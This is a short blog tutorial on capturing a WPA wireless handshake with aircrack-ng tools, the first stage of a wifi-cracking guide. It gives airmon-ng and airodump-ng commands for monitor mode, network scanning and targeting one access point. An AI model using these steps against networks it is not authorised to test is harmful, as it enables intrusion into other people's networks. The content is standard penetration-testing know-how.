
3 Ways to Crack Wifi using Pyrit, oclHashcat and Cowpatty
posted inHacking Tools, Kali Linux, Penetration Testing, Wireless Hacking	on June 26, 2016 by Raj Chandel SHARE

First start the monitor mode on our wireless adaptor .
--------------------------------------------------------airmon-ng start wlan0
Now the monitor mode is enabled with name wlan0mon.

and then with the following command start listening to all the available wifi connections:

--------------------------------------------( airodump-ng wlan0mon )
After running the above command it will start listening all the wifi traffic nearby so wait till your target appears and then hit ctrl^c.

Now we have to listen to a specific channel on which the target is present . Now run command:

--------------------------------------------( airodump-ng -c 2 –bssid 3C:1E:04:XX:XX:XX –write sommay wlan0mon )

-c == channel number of the target (2 in my case , see the CH column)

–bssid == MAC address of the target AP

–write == name of the capture file

Now wait till the WPA handshake is captured and then hit crtl^c.

Now a file named sommay-01.cap will be generated
